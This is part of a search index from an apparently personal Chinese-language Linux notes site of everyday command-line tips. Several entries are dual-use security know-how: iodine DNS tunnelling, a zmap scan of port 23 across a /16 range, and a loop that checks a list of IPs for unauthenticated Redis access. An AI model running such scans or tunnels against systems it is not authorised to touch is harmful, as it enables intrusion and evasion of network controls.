http://github.com/pts/rsyncbin/raw/master/rsync.rsync4android\nadb push rsync.bin /data/local/tmp/rsync\nadb shell chmod 755 /data/local/tmp/rsync\nadb shell /data/local/tmp/rsync --version\n\n# \u5728\u5b89\u5353\u4e0a\u542f\u52a8rsync server \u76d1\u542c\u57281873\u7aef\u53e3\uff0c\u8f6c\u53d1\u5230Linux\u76846010\u7aef\u53e3\nadb shell 'exec &gt;/sdcard/rsyncd.conf &amp;&amp; echo address = 127.0.0.1 &amp;&amp; echo port = 1873 &amp;&amp; echo \"[root]\" &amp;&amp; echo path = / &amp;&amp; echo use chroot = false &amp;&amp; echo read only = false'\nadb shell /data/local/tmp/rsync --daemon --no-detach --config=/sdcard/rsyncd.conf --log-file=/proc/self/fd/2\n# \u518d\u542f\u52a8\u4e00\u4e2a\u7ec8\u7aef\u7ee7\u7eed\nadb forward tcp:6010 tcp:1873\n\n# \u590d\u5236\u6574\u4e2a/sdcard\u76ee\u5f55\nrsync -avzP --stats rsync://localhost:6010/root/sdcard/ .\n</code></pre>"},{"location":"Linux-cli/","title":"Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7","text":"<p>\u672c\u6587\u6863\u4e00\u822c\u4e0d\u6d89\u53caroot\u6743\u9650\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a</p> <p>Linux\u7cfb\u7edf\u914d\u7f6e</p> <p>SSH\u8fdc\u7a0b\u767b\u5f55</p> <p>Linux\u5907\u4efd</p>"},{"location":"Linux-cli/#_1","title":"\u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9","text":"<p>\u5c06\u4ee5\u4e0b\u5185\u5bb9\u52a0\u5165<code>~/.bashrc</code>\u4e2d\u5373\u53ef\uff0c\u5224\u65ad\u5982\u679c\u5728\u5185\u7f6e\u547d\u4ee4\u5c31\u8c03\u7528help -m\uff0c\u4e0d\u662f\u5219\u7ed5\u5f00bash\u51fd\u6570\u6765\u8fd0\u884cman\u8fdb\u7a0b</p> <pre><code>man () {\ncase \"$(type -t -- \"$1\")\" in\nbuiltin|keyword)\nhelp -m \"$1\" | sensible-pager\n        ;;\n*)\ncommand man \"$@\"\n;;\nesac\n}\n</code></pre>"},{"location":"Linux-cli/#grep","title":"grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863","text":"<p>\u7528\u4e24\u4e2a\u6a2a\u7ebf<code>--</code>\u4f5c\u4e3agrep\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u4e0d\u8981\u628a\u5176\u540e\u9762\u7684\u5f62\u5982<code>-z</code>\u7684\u53c2\u6570\u5f53\u6210grep\u7684\u53c2\u6570</p> <p>\u4f8b\u5982\u6211\u60f3\u77e5\u9053tar\u547d\u4ee4\u4e2d\u7684-z\u662f\u4ec0\u4e48\u610f\u601d\uff1a</p> <pre><code>man tar|grep -- -z\n</code></pre>"},{"location":"Linux-cli/#grepstderrstdout","title":"\u5e2e\u52a9\u6587\u672c\u7684grep\uff0c\u628astderr\u91cd\u5b9a\u5411\u5230stdout","text":"<p>\u67d0\u4e9b\u65f6\u5019\u5e2e\u52a9\u6587\u672c\u662f\u8f93\u51fa\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u7684\uff0c\u9700\u8981\u75282&gt;&amp;1\u8fd9\u6837\u7684\u91cd\u5b9a\u5411\u54af</p> <pre><code>ssh-keygen --help 2&gt;&amp;1|grep bit\n</code></pre>"},{"location":"Linux-cli/#_2","title":"\u5404\u79cd\u89e3\u538b\u547d\u4ee4","text":"<p>tar.gz\uff1a <code>tar -zxvf xx.tar.gz</code></p> <p>tar.bz2\uff1a <code>tar -jxvf xx.tar.bz2</code></p> <p>zip\uff1a<code>unzip xx.zip</code></p> <p>\u53c2\u6570\u542b\u4e49\uff1a</p> <p>-x\u89e3\u538b\uff0c-v\u8be6\u7ec6\u663e\u793a\u89e3\u538b\u51fa\u6765\u7684\u4e1c\u897f\uff08\u5982\u679c\u662f\u4e00\u4e2a\u590d\u6742\u7684\u538b\u7f29\u5305\u5efa\u8bae\u4e0d\u8981\u7528\u4ee5\u52a0\u5feb\u89e3\u538b\u901f\u5ea6\uff09\uff0c-f\u540e\u63a5\u538b\u7f29\u6587\u4ef6\u7684\u6587\u4ef6\u540d</p>"},{"location":"Linux-cli/#_3","title":"\u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22","text":"<p>\u8fd9\u91cc\u8981\u641c\u7d22\u5f53\u524d\u76ee\u5f55\u4e0b\u9762\u6240\u6709\u7684\u5305\u542b\u201dMultiTeam\u201d\u6587\u4ef6</p> <pre><code>grep MultiTeam -r .\n</code></pre>"},{"location":"Linux-cli/#_4","title":"\u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570","text":"<p>find \u6307\u5b9a\u6587\u4ef6\u540e\u7f00\u540d\uff0c\u8bb0\u4f4f\u8981\u5f15\u53f7\u907f\u514dbash\u89e3\u6790*</p> <pre><code>find -name \"*.py\" -o -name \"*.md\"|xargs cat|wc\n</code></pre>"},{"location":"Linux-cli/#_5","title":"\u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f","text":"<p>\u7528xargs -d\u6307\u5b9a\u5206\u9694\u7b26\u4e3a\\n\uff08\u9ed8\u8ba4\u4f1a\u6309\u7167\u7a7a\u683c\u548c\\n\u5206\u9694\u53c2\u6570\uff09</p> <pre><code>cat list.txt | xargs -d \"\\n\" ls -alh\n</code></pre>"},{"location":"Linux-cli/#wget","title":"wget\u6162\u6162\u4e0b\u8f7d","text":"<pre><code>wget -i list.txt  -nc --wait=60 --random-wait\n</code></pre> <p>\u5176\u4e2dnc\u8868\u793a\u5df2\u7ecf\u4e0b\u8f7d\u5230\u7684\u6587\u4ef6\u5c31\u4e0d\u8981\u518d\u8bf7\u6c42\u4e86\uff0cwait=60\u8868\u793a\u4e24\u6b21\u8bf7\u6c42\u95f4\u969460s\uff0crandom-wait\u8868\u793a\u968f\u673a\u7b49\u5f852~120s</p>"},{"location":"Linux-cli/#touch","title":"touch\u4fee\u6539\u65f6\u95f4\u6233","text":"<p>\u5c06b.txt\u7684\u65f6\u95f4\u6233\u6539\u4e3a\u548ca.txt\u4e00\u6837</p> <pre><code>touch -r a.txt b.txt\n</code></pre>"},{"location":"Linux-cli/#ubuntuls","title":"\u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272","text":"<pre><code>unalias ls\n</code></pre> <p>\u6216\u8005\u76f4\u63a5\u4f7f\u7528\uff1aCredits @rachpt</p> <pre><code>\\ls\n</code></pre> <p>\u540c\u7406\u4e5f\u53ef\u4ee5\u7ed5\u8fc7grep\u7684alias: <code>\\grep</code></p>"},{"location":"Linux-cli/#_6","title":"\u6362\u884c\u65b9\u5f0f\u4fee\u6539","text":"<p>\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u6765\u81ea\u4e8eWindows\uff0c\u53ef\u80fd\u9700\u8981\u5148\u4fee\u6539\u6362\u884c\u65b9\u5f0f\u624d\u80fd\u7528\uff0c\u53bb\u6389\u6587\u4ef6\u4e2d\u7684\\r</p> <p>vim\u4e2d\u8f93\u5165 <code>:set ff=unix</code></p>"},{"location":"Linux-cli/#iodine-dns","title":"iodine\u2013\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e","text":"<ul> <li>http://code.kryo.se/iodine/</li> </ul> <p>\u6ce8\u610f\uff1a \u672c\u65b9\u6848\u7f51\u901f\u6781\u4f4e\uff0c\u4f7f\u7528\u65f6\u8981\u6709\u8db3\u591f\u7684\u8010\u5fc3\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u590d\u6742\u60c5\u51b5\u4e0b\u662f\u5426\u53ef\u884c\uff08\u5c24\u5176\u662fWindows\uff09</p> <p>\u524d\u671f\u51c6\u5907\uff1a\u4e00\u4e2a\u57df\u540d\uff08\u5047\u8bbe\u4e3aexample.com\uff09\u53ca\u4e00\u53f0\u670d\u52a1\u5668\uff08\u5047\u8bbe\u4e3a1.2.3.4\uff09\uff0c\u5efa\u8bae\u5ba2\u6237\u7aef\u5728Linux\u4e0a\u8fd0\u884c</p>"},{"location":"Linux-cli/#1","title":"1. \u8bbe\u7f6e\u57df\u540d\u89e3\u6790","text":"<p>dns.example.com\u6dfb\u52a0\u4e00\u6761A\u8bb0\u5f55\uff0c\u89e3\u6790\u81f31.2.3.4</p> <p>t.example.com\u6dfb\u52a0\u4e00\u6761NS\u8bb0\u5f55\uff0c\u503c\u4e3adns.example.com</p>"},{"location":"Linux-cli/#2","title":"2. \u670d\u52a1\u5668\u7aef","text":"<pre><code>./iodined -f -c -P secretpassword 192.168.99.1 t.example.com\n</code></pre> <p>-f\u8868\u793a\u6301\u7eed\u5360\u7528\u524d\u53f0\uff0c-c\u8868\u793a\u4e0d\u9650\u5236\u8bf7\u6c42\u6e90\uff0c-P\u6307\u5b9a\u5bc6\u7801\uff0c\u6700\u540e\u662f<code>\u5185\u7f51IP</code>\u548c\u4f7f\u7528\u7684\u57df\u540d</p> <p>\u5185\u7f51IP\u53ef\u4ee5\u968f\u610f\u6307\u5b9a\uff0c\u53ea\u8981\u5f53\u524d\u670d\u52a1\u5668\u6ca1\u6709\u5360\u7528\u5373\u53ef\uff0c\u4f8b\u5982\u53ef\u4ee5\u6539\u4e3a172.16.0.1</p>"},{"location":"Linux-cli/#3","title":"3.\u68c0\u67e5\u670d\u52a1\u7aef\u662f\u5426\u6b63\u5e38","text":"<p>http://code.kryo.se/iodine/check-it/</p> <p>\u4f5c\u8005\u63d0\u4f9b\u4e86\u5728\u7ebf\u68c0\u67e5\u5de5\u5177\uff0c\u8f93\u5165t.example.com\u5373\u53ef\u68c0\u67e5</p>"},{"location":"Linux-cli/#4","title":"4.\u5ba2\u6237\u7aef","text":"<p>\u5efa\u8bae\u5728ubuntu\u7b49\u5b8c\u6574\u7684Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u4e0b\u8f7d\u6e90\u7801\u540emake\u5373\u53ef</p> <pre><code> ./iodine -f -P secretpassword t.example.com\n</code></pre> <p>\u6548\u679c\u56fe\uff1a</p> <p></p>"},{"location":"Linux-cli/#windows","title":"\u8fdc\u7a0b\u63a7\u5236Windows","text":"<p>Windows\u4e0b\u6709\u81ea\u5e26\u7684mstsc\uff0cLinux\u5982\u6811\u8393\u6d3e\u7528\u5565\u5462\uff1f\u5c31\u7528rdesktop\u5566</p> <p>\u624b\u518c\u67e5\u8be2\u7528<code>man rdesktop</code></p> <p>\u5feb\u901f\u4f7f\u7528\uff1a</p> <pre><code>sudo apt-get install -y rdesktop\nrdesktop -f -k en-us -C -N -z -xl -P -u \u7528\u6237\u540d -p \u5bc6\u7801 \u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3\n</code></pre> <p>\u5176\u4e2d-f\u8868\u793a\u5168\u5c4f\uff0c -k\u8bbe\u7f6e\u952e\u76d8\u5e03\u5c40\uff0c -C\u4f7f\u7528\u79c1\u6709\u989c\u8272\u8868\uff0c-N\u540c\u6b65NumLock\uff0c-z\u542f\u7528\u538b\u7f29\uff0c-xl \u8bbe\u7f6e\u4e3aLAN\u573a\u666f\uff0c-P\u4f7f\u7528bitmap\u7f13\u5b58</p> <p>\u6ce8\u610f\u4e0a\u8ff0\u5728\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528\u660e\u6587\u5bc6\u7801\u5e76\u4e0d\u5b89\u5168\uff0c\u53ef\u80fd\u88ab\u5176\u4ed6\u7528\u6237\u7528ps\u7b49\u5de5\u5177\u770b\u5230\uff0c\u5efa\u8bae\u4ec5\u4ec5\u5728\u5b8c\u5168\u81ea\u5df1\u63a7\u5236\u7684Linux\u4e0a\u7cfb\u7edf\u4e0a\u8fd9\u6837\u64cd\u4f5c</p>"},{"location":"Linux-cli/#_7","title":"\u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee","text":"<p>awk\u662f\u4e2a\u5f88\u597d\u7528\u7684\u5de5\u5177\u5462\uff0c\u652f\u6301substr\u51fd\u6570\uff0c\u7528\u6cd5\u4e3asubstr(\u6e90\u5b57\u7b26\u4e32\uff0c\u5f00\u59cb\uff0c\u957f\u5ea6)\uff0c\u5176\u4e2d\u5f00\u59cb\u4ece1\u8ba1\u6570</p> <p><code>ls -l</code> \u957f\u5217\u8868\u663e\u793a\u7684\u8bdd\uff0c\u6309\u7a7a\u683c\u5206\u5c31\u662f$9</p> <pre><code>ls -l|awk '{if(substr($9,1,\u5b57\u7b26\u4e32\u957f\u5ea6)==\"\u4f60\u8981\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\") print $9}'|sort|uniq|wc -l\n</code></pre>"},{"location":"Linux-cli/#hexdump","title":"hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801","text":"<p>echo\u7684-n\u53c2\u6570\u8868\u793a\u4e0d\u8981\u672b\u5c3e\u52a0\\n</p> <pre><code>echo -n hello | hexdump -C\n</code></pre>"},{"location":"Linux-cli/#_8","title":"\u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f","text":"<p>sort\u7684-h\u8868\u793a\u6309\u4eba\u7c7b\u7406\u89e3\u7684\u5927\u5c0f\u683c\u5f0f\u6392\u5e8f\uff0c-r\u8868\u793a\u9006\u5e8f</p> <pre><code>du -sh * | sort -hr\n</code></pre>"},{"location":"Linux-cli/#ffmpeg","title":"\u5b89\u88c5ffmpeg","text":"<p>\u5728ubuntu14\u4e0b\u662f\u6ca1\u6709ffmpeg\u7684\u5b98\u65b9\u5305\u652f\u6301\u7684\uff0c\u9700\u8981\u6dfb\u52a0mc3man\u7684ppa</p> <pre><code>sudo add-apt-repository ppa:mc3man/trusty-media\n#\u6309\u56de\u8f66\u7ee7\u7eed\nsudo apt-get update\nsudo apt-get install -y ffmpeg\n</code></pre>"},{"location":"Linux-cli/#set-ex","title":"\u4fdd\u8bc1\u811a\u672c\u5b89\u5168\u6267\u884cset -ex","text":"<p><code>set</code>\u547d\u4ee4\u633a\u6709\u7528\u7684\u5462\uff0c-e\u8868\u793a\u5982\u679c\u540e\u9762\u7684\u8bed\u53e5\u8fd4\u56de\u4e0d\u4e3a0\u7acb\u523b\u7ed3\u675fshell\uff0c-x\u8868\u793a\u663e\u793a\u51fa\u6bcf\u6761\u547d\u4ee4\u53ca\u53c2\u6570</p> <p>\u4ece\u4eba\u5bb6\u7684Dockerfile\u4e2d\u5b66\u4e60\u5f97\u6765</p>"},{"location":"Linux-cli/#change-readonly-bash-variable","title":"change readonly bash variable","text":"<p>bash is a weird thing\u2026</p> <p>declaring a variable as reference by using <code>declare -n</code>, we can change it!</p> <pre><code>$ a=1\n$ readonly a\n$ a=2\nbash: a: readonly variable\n#Look here!\n$ declare -n a\n$ a=2\n$ echo $a\n2\n</code></pre>"},{"location":"Linux-cli/#sleep-infinity","title":"\u6c38\u4e45\u7b49\u5f85 sleep infinity","text":"<p>\u6709\u65f6\u5199\u4e86\u4e00\u4e2ash\u6587\u4ef6\u540e\u9700\u8981\u4fdd\u6301\u8fd9\u4e2ash\u7684\u8fd0\u884c\uff0c\u5c31\u7528sleep\u6c38\u4e45\u7b49\u5f85\u597d\u54af</p> <pre><code>sleep infinity\n</code></pre>"},{"location":"Linux-cli/#zmap","title":"zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3","text":"<p>zmap\u7684\u8fd0\u884c\u9700\u8981root\u6743\u9650\uff0c\u7528<code>apt-get install zmap</code>\u5373\u53ef\u5b89\u88c5</p> <p>\u66f4\u8be6\u7ec6\u7684\u5e2e\u52a9\u53bb\u770b\u770b<code>zmap --help</code>\u54af</p> <pre><code>#\u9700\u8981\u5148\u7f16\u8f91\u9ed1\u540d\u5355 vi /etc/zmap/blacklist.conf \u53d6\u6d88\u6389\u6ce8\u91ca\nzmap 192.168.0.0/16 -B1000M -i eth0 -g -T 4  -p 23 -o 23.txt\n</code></pre> <p>\u5176\u4e2d<code>-g</code>\u8868\u793a\u626b\u63cf\u7ed3\u675f\u540e\u663e\u793a\u603b\u7ed3\uff0c<code>-T 4</code>\u8868\u793a\u542f\u52a84\u4e2a\u626b\u63cf\u7ebf\u7a0b\uff0c<code>-p 23</code>\u8868\u793a\u626b\u63cf23\u7aef\u53e3\uff0c-o\u4fdd\u5b58\u6587\u4ef6\u7684\u540d\u79f0</p> <p>\u5982\u679c\u62e8\u53f7\u4e86vpn\uff0c\u9700\u8981\u7528-G\u6307\u5b9a\u7f51\u5173\u7684MAC\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7<code>arp \u7f51\u5173\u7684IP</code>\u5f97\u5230</p>"},{"location":"Linux-cli/#ipredis","title":"\u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e","text":"<pre><code>for i in `cat iplist.txt`; do (if [ `echo PING|redis-cli -h $i` == \"PONG\" ] ;then echo $i;fi);done 2&gt;/dev/null\n</code></pre> <p>\u5229\u7528\u4e86bash\u652f\u6301\u7684for\u8bed\u53e5\uff0c\u6ce8\u610ffor\u4e4b\u540e\u7684\u5206\u53f7\u548c\u6700\u540e\u7684done</p> <p>\u8fd8\u6709\u7528\u4e86if\u5b57\u7b26\u4e32\u76f8\u7b49\uff0c\u8bb0\u5f97\u8981\u7528fi\u7ed3\u675fif</p> <p>redis-cli\u8fde\u63a5\u4e0a\u670d\u52a1\u5668\u540e\u53d1\u9001PING\uff0c\u5982\u679c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5219\u4f1a\u8fd4\u56dePONG\uff0c\u5426\u5219\u4f1a\u8981\u6c42Auth\u6216\u8005\u5176\u4ed6\u62a5\u9519\u4fe1\u606f</p>"},{"location":"Linux-cli/#imagemagick","title":"\u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a","text":"<p>\u5b89\u88c5\u547d\u4ee4\uff1a<code>sudo apt-get install -y imagemagick</code></p> <p>\u5904\u7406\u4e00\u5f20\u56fe\u7247in.png\uff0c\u88c1\u526a\u6210300x280\u5927\u5c0f\uff0c\u4ece(30,0)\u4f5c\u4e3a\u88c1\u526a\u7684\u5de6\u4e0a\u89d2\u70b9\uff0c\u5f97\u5230out.png\uff1a</p> <pre><code>convert in.png -crop 300x280+30+0 out.png\n</code></pre> <p>\u5176\u5b9e\u8fd9\u56db\u4e2a\u53c2\u6570\u662f\u6211\u53cd\u590d\u5c1d\u8bd5\u4e8c\u5206\u6cd5\u5f97\u5230\u7684\uff0c\u6216\u8bb8\u53ef\u4ee5\u7528\u4e13\u4e1a\u8f6f\u4ef6\u5feb\u901f\u5f97\u5230\u5427</p> <p>\u5173\u952e\u662f\u53ef\u4ee5\u6279\u91cf\u5904\u7406\u5440\uff0c\u8fd9\u91cc\u4e0b\u8f7dfriends\u7684\u5934\u50cf\u56fe\u7247\u8fdb\u884c\u5904\u7406\uff1a</p> <pre><code>for i in {1..79}; do curl -o $i.png http://kemono-friends.jp/wp-content/uploads/2016/11/no`printf \"%03d\" $i`.png --proxy socks5://127.0.0.1:1080; done\nfor i in {1..79}; do convert $i.png -crop 300x280+30+0 $i.png; done\n</code></pre> <p>\u5176\u4e2d\u4f7f\u7528\u4e86printf\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u5f971\u53d8\u6210\u4eba\u5bb6url\u9700\u8981\u7684001</p>"},{"location":"Linux-cli/#0","title":"\u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664","text":"<pre><code>find . -size 0 -delete\n</code></pre> <p>\u67e5\u627e\u5927\u4e8e100M\u7684\u6587\u4ef6\uff1a<code>find . -size +100M</code></p>"},{"location":"Linux-cli/#_9","title":"\u6279\u91cf\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d","text":"<p>\u5c06\u5f53\u524d\u76ee\u5f55\u4e0b(\u5305\u542b\u5b50\u76ee\u5f55)\u6240\u6709\u7684txt\u6587\u4ef6\u6539\u4e3a.newext\u540e\u7f00\uff1a</p> <pre><code>find . -name \"*.txt\" -exec rename 's/.txt$/.newext/' {} \\;\n</code></pre> <p>\u5982\u679ccurl\u4e0b\u8f7d\u7684\u65f6\u5019\u5141\u8bb8gzip\u4f46\u5fd8\u4e86\u2013compressed\u5f97\u5230\u7684\u6587\u4ef6\u662fgzip\u538b\u7f29\u7684\uff0c\u4fee\u6539\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.txt\u4e3a.txt.gz\uff0c\u7136\u540e\u89e3\u538b\u7f29\uff1a\u5176\u4e2drename -v\u8868\u793a\u663e\u793a\u4fee\u6539\u7684\u5217\u8868</p> <pre><code>rename -v 's/.txt$/.txt.gz/' *.txt\ngunzip *.gz\n</code></pre>"},{"location":"Linux-cli/#vimr","title":"\u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26","text":"<p>\u7528vim\u6253\u5f00\u6587\u4ef6\u540e\uff0c\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u5192\u53f7\u4e5f\u662f\u9700\u8981\u6309\u7684</p> <pre><code>:set ff=unix\n:wq\n</code></pre>"},{"location":"Linux-cli/#free","title":"\u4e0d\u7528free\u67e5\u770b\u5185\u5b58\u5360\u7528","text":"<p>\u5728docker\u5bb9\u5668\u5185\u90e8\u4e00\u822c\u662f\u4e0d\u80fd\u901a\u8fc7<code>free -h</code>\u6765\u67e5\u770b\u771f\u5b9e\u5360\u7528\u7684\u5185\u5b58\u7684\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u91c7\u7528<code>ps aux</code>\u7d2f\u52a0RSS\u5b57\u6bb5\u6765\u4f30\u8ba1\uff1a</p> <pre><code>ps aux | awk '{sum+=$6} END {print sum / 1024}'\n</code></pre>"},{"location":"Linux-cli/#watch","title":"watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa","text":"<p>\u4f8b\u5982\u6211\u60f3\u6301\u7eed\u67e5\u770boutput.txt\u6587\u4ef6\u5927\u5c0f\uff1a</p> <pre><code>watch -n 1 ls -l output.txt\n</code></pre> <p>\u5176\u4e2d<code>-n 1</code>\u8868\u793a\u6bcf\u96941s\u5237\u65b0\u4e00\u6b21</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u7b49\u4ef7\u4e8e\u81ea\u5df1\u5199\u4e2abash\u811a\u672c\uff1a</p> <pre><code>#! /bin/bash\nwhile [ 1 ]\ndo\n# do your work here...\nsleep 1\nclear\ndone\n</code></pre>"},{"location":"Linux-cli/#2truecrypt-71amake-j5-l4","title":"\u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1","text":"<p>\u53c2\u7167http://davidstutz.de/installing-truecrypt-raspbian/\uff0c\u4e00\u6b65\u6b65\u6765\u5c31\u884c\u5566</p> <p>\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff0c\u5176\u4e2dmake\u4f7f\u7528\u53c2\u6570<code>-j5 -l4</code>\u8868\u793a\u540c\u65f6\u6267\u884c5\u4e2a\u7f16\u8bd1\u4f46\u9650\u5236\u7cfb\u7edf\u8d1f\u8f7d&lt;4\uff08\u56e0\u4e3a\u7f16\u8bd1\u8fc7\u7a0b\u5f88\u6162\uff0c\u76f4\u63a5make\u53ea\u4f1a\u4f7f\u75281\u4e2aCPU\uff0c\u8fd9\u6837\u8bbe\u7f6e\u540e\u53ef\u4ee5\u5145\u5206\u5229\u7528\u6811\u8393\u6d3e4\u6838\u5fc3CPU\uff09\uff1a</p> <p>\u6d89\u53ca\u7684\u538b\u7f29\u5305truecrypt-targz.zip\uff0cwxWidgets-2.8.11.zip\uff0cpkcs.zip</p> <pre><code>apt-get install -y unzip build-essentials pkg-config gtk2.0-dev libfuse-dev\n#\u7528unzip\u89e3\u538b\u538b\u7f29\u5305\uff0c\u90fd\u89e3\u538b\u5230/root\u4e0b\uff0c\u76ee\u5f55\u7ed3\u6784\uff1a\n# /root\n#  | - truecrypt-targz\n#  | - wxWidgets-2.8.11\n#  | - pkcs\n\ncd wxWidgets-2.8.11\n./configure\nmake -j5 -l4 #\u7279\u522b\u6162\uff0c\u8010\u5fc3\u7b49\u5f85\nmake -j5 -l4 install\n\ncd ../truecrypt-targz\nexport PKCS11_INC=/root/pkcs/\nmake -j5 -l4 NOGUI=1 WX_ROOT=/root/wxWidgets-2.8.11 wxbuild\nmake -j5 -l4 NOGUI=1 WXSTATIC=1\n\nMain/truecrypt --version #\u8f93\u51faTrueCrypt 7.1a\ncp Main/truecrypt /usr/local/bin/\n</code></pre> <p>\u4f60\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u7248\u672ctruecrypt-armv7l</p>"},{"location":"Linux-cli/#scp","title":"scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20","text":"<p>\u6b63\u5728\u62f7\u8d1d\u76ee\u5f55\u7684\u65f6\u5019\u88ab\u4e2d\u65ad\u4e86\uff08\u4f8b\u5982mount.ntfs\u5361\u6b7b\uff09\uff0c\u800cscp\u4e0d\u80fd\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u3001\u53ea\u4f1a\u8986\u76d6\uff1b\u5982\u679c\u7528rsync\u5b8c\u5168\u65ad\u70b9\u7eed\u4f20\u4f3c\u4e4e\u4f1a\u6821\u9a8c\u6587\u4ef6\uff0c\u592a\u6162</p> <p>\u65b9\u6cd5\u662f\uff1a\u5220\u6389\u4e2d\u65ad\u65f6\u6b63\u5728\u62f7\u8d1d\u7684\u4e0d\u5b8c\u6574\u6587\u4ef6\uff0c\u4f7f\u7528\u4e0b\u8ff0\u547d\u4ee4\u6765\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff1a</p> <p>\u5047\u8bbe\u8981\u628a\u8fdc\u7a0b\u76ee\u5f55/path/\u8fd9\u4e2a\u6587\u4ef6\u5939\u6574\u4e2a\u62f7\u8d1d\u5230/mnt/\u4e0b\uff08\u4e5f\u5c31\u662f\u5185\u5bb9\u62f7\u8d1d\u5230/mnt/path/\u4e0b\uff09</p> <pre><code>rsync --progress -v -au username@host:\"'/path'\" /mnt/\n</code></pre> <p>\u6ce8\u610f\u6e90\u8def\u5f84/path\u540e\u9762\u4e0d\u80fd\u6709/\uff0c\u5426\u5219rsync\u4e0d\u4f1a\u521b\u5efa/mnt/path\u8fd9\u4e2a\u6587\u4ef6\u5939\uff1b/path\u88ab\u4e24\u5c42\u5f15\u53f7\u5305\u56f4\u662f\u4e3a\u4e86\u652f\u6301\u542b\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u4e00\u5c42\u662f\u672c\u5730\u547d\u4ee4\uff0c\u8fdc\u7a0b\u76ee\u5f55\u4e5f\u8981\u4e00\u5c42</p> <p>rsync\u7684<code>--progress -v</code>\u53c2\u6570\u8868\u793a\u663e\u793a\u5f53\u524d\u8fdb\u5ea6\u548c\u66f4\u591a\u5185\u5bb9\uff0c<code>-a</code>\u8868\u793aarchive\u9012\u5f52\u5e76\u5c3d\u53ef\u80fd\u539f\u6837\u4fdd\u7559\u6240\u6709\u4fe1\u606f\uff0c<code>-u</code>\u8868\u793a\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6</p> <p>\u67e5\u770bman\u6587\u6863 explainshell.com</p>"},{"location":"Linux-cli/#wgetscp","title":"\u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09","text":"<p>\u5728\u5185\u7f51\u4f20\u8f93\u975e\u654f\u611f\u6570\u636e\u65f6\uff0c\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528scp\uff08\u57fa\u4e8essh\uff09\u7684\u5b89\u5168\u4f20\u8f93\uff0c\u5c24\u5176\u662f\u6811\u8393\u6d3e\u8fd9\u79cd\u8ba1\u7b97\u6027\u80fd\u6709\u9650\u7684\u60c5\u5f62\u3002\u4f7f\u7528HTTP\u80fd\u6709\u6548\u52a0\u901f\u4f20\u8f93\u8fc7\u7a0b\uff0c\u4e14\u90e8\u7f72\u7b80\u5355\uff0c\u76f8\u6bd4\u914d\u7f6e\u590d\u6742\u7684vsftpd\u53ef\u4ee5\u8bf4\u662f\u5f88\u7b80\u5355\u4e86</p>"},{"location":"Linux-cli/#_10","title":"\u670d\u52a1\u7aef\uff08\u6570\u636e\u4f20\u51fa\u7aef\uff09","text":"<p>\u4f7f\u7528nginx\u914d\u7f6e\u5141\u8bb8\u5217\u76ee\u5f55\u5373\u53ef\uff0c\u5728/etc/nginx/sites-enabled/\u4e0b\u6dfb\u52a0\u4e00\u4e2a\u6587\u4ef6\uff1a</p> <pre><code>server{\n    listen 8080;\n    root /path/to/your/dir;\n    autoindex on;\n    autoindex_exact_size off;\n    autoindex_localtime on;\n}\n</code></pre> 